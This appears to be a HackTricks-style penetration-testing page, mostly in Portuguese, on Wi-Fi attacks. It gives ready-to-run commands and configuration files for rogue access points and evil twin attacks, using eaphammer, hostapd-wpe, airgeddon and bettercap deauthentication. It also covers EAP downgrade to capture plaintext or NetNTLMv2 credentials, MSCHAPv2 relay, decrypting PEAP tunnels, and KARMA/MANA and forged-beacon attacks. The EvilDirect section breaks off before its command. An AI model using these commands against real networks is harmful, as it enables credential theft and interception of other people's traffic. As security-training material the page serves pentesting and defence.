Antes de explicar como executar ataques mais complexos, será explicado **como** apenas **criar** um **AP** e **redirecionar** seu **tráfego** para uma interface conectada **à** **Internet**.

Usando `ifconfig -a` verifique se a interface wlan para criar o AP e a interface conectada à Internet estão presentes.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Crie o arquivo de configuração `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Então **set IPs** e **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
E então **inicie** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Crie um arquivo de configuração `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Pare processos incômodos** , ative **monitor mode**, e **inicie hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Encaminhamento e Redirecionamento
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Um evil twin attack explora a forma como clientes WiFi reconhecem redes, baseando-se principalmente no nome da rede (ESSID) sem exigir que a estação base (access point) se autentique perante o cliente. Pontos-chave incluem:

- **Dificuldade de diferenciação**: Dispositivos têm dificuldade em distinguir entre access points legítimos e rogue access points quando compartilham o mesmo ESSID e tipo de encriptação. Redes do mundo real frequentemente usam múltiplos access points com o mesmo ESSID para estender a cobertura de forma transparente.
- **Roaming do cliente e manipulação de conexão**: O protocolo 802.11 permite que dispositivos façam roaming entre access points dentro do mesmo ESS. Atacantes podem explorar isso atraindo um dispositivo para desconectar da sua estação base atual e conectar-se a uma rogue access point. Isso pode ser conseguido oferecendo um sinal mais forte ou interrompendo a conexão com o access point legítimo por meio de métodos como deauthentication packets ou jamming.
- **Desafios na execução**: Executar com sucesso um evil twin attack em ambientes com múltiplos access points bem posicionados pode ser desafiador. Deauthenticating um único access point legítimo frequentemente resulta na conexão do dispositivo a outro access point legítimo, a menos que o atacante consiga deauthenticate todos os access points próximos ou posicione estrategicamente o rogue access point.

Você pode criar um Open Evil Twin muito básico (sem capacidade de rotear tráfego para a Internet) fazendo:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Você também pode criar um Evil Twin usando **eaphammer** (observe que para criar evil twins com eaphammer a interface **NÃO deve estar** em **monitor** mode):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Ou usando Airgeddon: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

Por favor, note que por padrão, se um ESSID na PNL estiver salvo como protegido por WPA, o dispositivo não se conectará automaticamente a um Open evil Twin. Você pode tentar DoS o AP real e torcer para que o usuário conecte manualmente ao seu Open evil Twin, ou pode DoS o AP real e usar um WPA Evil Twin para capturar o handshake (usando este método você não conseguirá permitir que a vítima se conecte a você, pois você não conhece o PSK, mas pode capturar o handshake e tentar cracká-lo).

_Alguns OS e AV vão alertar o usuário que conectar a uma rede Open é perigoso..._

### WPA/WPA2 Evil Twin

Você pode criar um **Evil Twin using WPA/2** e, se os dispositivos estiverem configurados para se conectar a esse SSID com WPA/2, eles vão tentar se conectar. De qualquer forma, **para completar o 4-way-handshake** você também precisa **saber** a **senha** que o cliente irá usar. Se você **não souber** dela, a **conexão não será completada**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Para entender estes ataques, recomendo ler antes a breve [WPA Enterprise explanation](#wpa-enterprise-mgt).

**Usando hostapd-wpe**

`hostapd-wpe` precisa de um arquivo de **configuração** para funcionar. Para **automatizar** a geração dessas configurações, você pode usar [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) (faça o download do arquivo python dentro de _/etc/hostapd-wpe_/)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
No arquivo de configuração você pode selecionar várias coisas diferentes, como ssid, channel, arquivos de usuário, cret/key, dh parameters, wpa version e auth...

[**Usando hostapd-wpe com EAP-TLS para permitir que qualquer certificado faça login.**](evil-twin-eap-tls.md)

**Usando EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Por padrão, o EAPHammer utiliza estes métodos de autenticação (observe GTC como o primeiro a ser testado para obter plaintext passwords e, em seguida, o uso de métodos de autenticação mais robustos):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Esta é a metodologia padrão para evitar longos tempos de conexão. No entanto, você também pode especificar ao servidor os métodos de autenticação do mais fraco ao mais forte:
```
--negotiate weakest
```
Ou você também pode usar:

- `--negotiate gtc-downgrade` to use highly efficient GTC downgrade implementation (plaintext passwords)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` to specify manually the methods offered (offering the same auth methods in the same order as the organisation the attack will be much more difficult to detect).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

#### When clients skip RADIUS certificate validation (PEAP/TTLS)

- If devices are configured with "do not validate certificate", a cloned AP + rogue RADIUS (`eaphammer --cert-wizard --creds --auth wpa-eap`) will collect **NetNTLMv2** (PEAP-MSCHAPv2) or **cleartext** creds (PEAP-GTC). `bettercap` deauth (`wifi.deauth <BSSID>`) both reveals hidden SSIDs during probes and forces reconnects, unless PMF/802.11w blocks spoofed deauth.
- Cracked NetNTLMv2 gives reusable Wi‑Fi/AD creds; GTC yields immediate plaintext.

#### Relaying PEAP-MSCHAPv2 instead of cracking (wpa_sycophant + hostapd-mana)

- For machine accounts with uncrackable random passwords, abuse **MSCHAPv2 relay**: run `hostapd-mana` as the Evil Twin, forwarding the MSCHAPv2 exchange to `wpa_sycophant`, which simultaneously connects to the legitimate AP. Successful relay grants authenticated Wi‑Fi without recovering the password.
- Use builds that support the target security level (WPA3/PMF requires recent hostapd/wpa_supplicant); PMF prevents deauth coercion, so wait for voluntary client associations.

**Using Airgeddon**

`Airgeddon` can use previously generated certificated to offer EAP authentication to WPA/WPA2-Enterprise networks. The fake network will downgrade the connection protocol to EAP-MD5 so it will be able to **capture the user and the MD5 of the password**. Later, the attacker can try to crack the password.\
`Airggedon` offers you the possibility of a **continuous Evil Twin attack (noisy)** or **only create the Evil Attack until someone connects (smooth).**

![](<../../images/image (936).png>)

### Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks

_This method was tested in an PEAP connection but as I'm decrypting an arbitrary TLS tunnel this should also works with EAP-TTLS_

Inside the **configuration** of _hostapd-wpe_ **comment** the line that contains _**dh_file**_ (from `dh_file=/etc/hostapd-wpe/certs/dh` to `#dh_file=/etc/hostapd-wpe/certs/dh`)\
This will make `hostapd-wpe` to **exchange keys using RSA** instead of DH, so you will be able to **decrypt** the traffic later **knowing the servers private key**.

Now start the **Evil Twin** using **`hostapd-wpe`** with that modified configuration as usual. Also, start **`wireshark`** in the **interface** which is performing the Evil Twin attack.

Now or later (when you have already captured some authentication intents) you can add the private RSA key to wireshark in: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Add a new entry and fill the form with this values: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**select your key file**, to avoid problems select a key file **without being password protected**).

![](<../../images/image (687).png>)

And look at the new **"Decrypted TLS" tab**:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons attack

### ESSID and MAC black/whitelists

Different types of Media Access Control Filter Lists (MFACLs) and their corresponding modes and effects on the behavior of a rogue Access Point (AP):

1. **MAC-based Whitelist**:
- The rogue AP will respond only to probe requests from devices specified in the whitelist, remaining invisible to all others not listed.
2. **MAC-based Blacklist**:
- The rogue AP will ignore probe requests from devices on the blacklist, effectively making the rogue AP invisible to those specific devices.
3. **SSID-based Whitelist**:
- The rogue AP will respond to probe requests only for specific ESSIDs listed, making it invisible to devices whose Preferred Network Lists (PNLs) do not contain those ESSIDs.
4. **SSID-based Blacklist**:
- The rogue AP will not respond to probe requests for the specific ESSIDs on the blacklist, making it invisible to devices seeking those particular networks.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Este método permite que um **atacante crie um ponto de acesso (AP) malicioso que responde a todas as probe requests** de dispositivos procurando conectar-se a redes. Essa técnica **engana os dispositivos para que se conectem ao AP do atacante** ao imitar as redes que os dispositivos estão procurando. Quando um dispositivo envia um pedido de conexão para esse AP malicioso, a conexão é concluída, fazendo com que o dispositivo se conecte equivocadamente à rede do atacante.

### MANA

Então, **os dispositivos passaram a ignorar respostas de rede não confiáveis**, reduzindo a eficácia do ataque karma original. No entanto, um novo método, conhecido como o **MANA attack**, foi introduzido por Ian de Villiers e Dominic White. Esse método envolve o AP malicioso **capturar as Preferred Network Lists (PNL) dos dispositivos respondendo às suas broadcast probe requests** com nomes de rede (SSIDs) previamente conhecidos pelos dispositivos. Esse ataque sofisticado contorna as proteções contra o ataque karma original ao explorar a forma como os dispositivos memorizam e priorizam redes conhecidas.

O MANA attack opera monitorando tanto directed quanto broadcast probe requests dos dispositivos. Para directed requests, registra o endereço MAC do dispositivo e o nome de rede solicitado, adicionando essa informação a uma lista. Quando um broadcast request é recebido, o AP responde com informações correspondentes a qualquer uma das redes na lista do dispositivo, atraindo o dispositivo a se conectar ao AP malicioso.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

A **Loud MANA attack** é uma estratégia avançada para quando dispositivos não usam directed probing ou quando suas Preferred Network Lists (PNL) são desconhecidas pelo atacante. Opera com o princípio de que **dispositivos na mesma área provavelmente compartilham alguns nomes de rede em suas PNLs**. Em vez de responder seletivamente, esse ataque transmite probe responses para todo nome de rede (ESSID) encontrado nas PNLs combinadas de todos os dispositivos observados. Essa abordagem ampla aumenta a chance de um dispositivo reconhecer uma rede familiar e tentar conectar-se ao rogue Access Point (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Quando o **Loud MANA attack** pode não ser suficiente, o **Known Beacon attack** apresenta outra abordagem. Este método **brute-forces the connection process by simulating an AP that responds to any network name, cycling through a list of potential ESSIDs** derivados de uma wordlist. Isso simula a presença de várias redes, na esperança de corresponder um ESSID na PNL da vítima, provocando uma tentativa de conexão ao AP fabricado. O ataque pode ser amplificado combinando-o com a opção `--loud` para uma tentativa mais agressiva de atrair dispositivos.

Eaphammer implementou esse ataque como um MANA attack onde todos os ESSIDs dentro de uma lista são anunciados (você também pode combinar isso com `--loud` para criar um Loud MANA + Known beacons attack):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

O **Known Beacon Burst attack** envolve a **transmissão em rajadas de beacon frames para cada ESSID listada em um arquivo**. Isso cria um ambiente denso de redes falsas, aumentando significativamente a probabilidade de dispositivos se conectarem ao rogue AP, especialmente quando combinado com um MANA attack. Essa técnica explora velocidade e volume para sobrecarregar os mecanismos de seleção de rede dos dispositivos.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** é um protocolo que permite que dispositivos se conectem diretamente entre si usando Wi‑Fi, sem a necessidade de um access point wireless tradicional. Essa capacidade está integrada em vários dispositivos de Internet of Things (IoT), como impressoras e televisores, facilitando a comunicação direta device-to-device. Uma característica notável do Wi‑Fi Direct é que um dispositivo assume o papel de access point, conhecido como group owner, para gerenciar a conexão.

A segurança das conexões Wi‑Fi Direct é estabelecida por meio de **Wi‑Fi Protected Setup (WPS)**, que suporta vários métodos de pareamento seguro, incluindo:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Esses métodos, particularmente o PIN entry, são suscetíveis às mesmas vulnerabilidades do WPS em redes Wi‑Fi tradicionais, tornando-os alvos de vetores de ataque semelhantes.

### EvilDirect Hijacking

**EvilDirect Hijacking** é um ataque específico ao Wi‑Fi Direct. Ele espelha o conceito de um ataque Evil Twin, mas direcionado a conexões Wi‑Fi Direct. Nesse cenário, um atacante se faz passar por um group owner legítimo com a finalidade de enganar dispositivos para que se conectem a uma entidade maliciosa. Esse método pode ser executado usando ferramentas como `airbase-ng`, especificando o canal, ESSID e o endereço MAC do dispositivo impersonado:

## References

- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)
- [Wireless-(in)Fidelity: Pentesting Wi-Fi in 2025 (Synacktiv)](https://www.synacktiv.com/en/publications/wireless-infidelity-pentesting-wi-fi-in-2025.html)
- [PEAP relay attacks with wpa_sycophant (SensePost)](https://sensepost.com/blog/2019/peap-relay-attacks-with-wpa_sycophant/)


TODO: Dê uma olhada em [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (login com Facebook e imitação de WPA em captive portals)

{{#include ../../banners/hacktricks-training.md}}
